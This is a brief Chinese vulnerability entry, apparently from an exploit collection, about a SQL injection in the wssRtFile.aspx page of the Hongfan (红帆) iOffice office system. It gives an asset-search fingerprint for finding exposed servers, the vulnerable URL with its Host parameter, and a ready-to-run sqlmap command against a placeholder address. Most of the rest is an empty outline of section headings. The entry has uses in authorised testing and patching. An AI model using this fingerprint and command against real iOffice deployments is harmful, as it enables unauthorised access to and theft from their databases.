# 红帆iOfficewssRtFile存在SQL注入漏洞

- **系统**：红帆　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="红帆 iOffice"`

**请求体 / payload**
```
/iOffice/prg/set/wss/wssRtFile.aspx?Host=1
sqlmap
sqlmap -u "http://xx.xx.xx.xx/iOffice/prg/set/wss/wssRtFile.aspx?Host=1" --batch --random-agent
```

**其他**
- 红帆iOffice wssRtFile存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 红帆iOffice